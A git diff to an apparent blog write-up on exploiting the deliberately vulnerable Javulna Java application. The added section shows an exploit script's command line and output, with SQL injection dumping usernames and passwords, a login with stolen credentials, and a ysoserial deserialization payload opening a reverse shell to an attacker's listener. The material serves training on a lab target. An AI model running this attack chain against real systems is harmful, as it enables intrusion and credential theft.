@@ -251,6 +251,24 @@ The steps to compromise the web application are as follows:
 
 I have posted the [full exploit code here](https://github.com/plackyhacker/plackyhacker.github.io/blob/master/code/javulna-exploit.py). I have tried to comment the code as much as possible so it makes sense.
 
+This is it running:
+
+```
+python3 ./exploit.py -t 10.10.0.120 -l 10.9.254.6 -p 1337
+[!] Don't forget to start your Netcat listener!
+[!] Press enter to start...
+[+] Carrying out SQLi attack...
+[+] Dumping accounts...
+    [-] Darth Vader:IamYourFather
+    [-] Princess Leia:IwishIhaveChoosenTheWookieInstead
+    [-] Yoda:NoSecretsATrueJediHas
+[+] Will use credentials: Yoda:NoSecretsATrueJediHas
+[+] Logging in to the web app...
+[+] Using ysoserial to generate a reverse shell payload...
+[+] Carrying out Java deserialization attack...
+[+] Have a nice day!
+```
+
 ## Finally
 
 There is loads of vulnerabilities in the Javulna application, ~there might even be~ there is other ways to get remote code execution. There is also a [Udemy Course](https://www.udemy.com/course/backend-development-security-fundamentals/) if you want to learn more about exploiting Java web applications. The course uses [Postman](https://www.postman.com) to demonstrate exploitation, so don't expect any `python` exploit code.
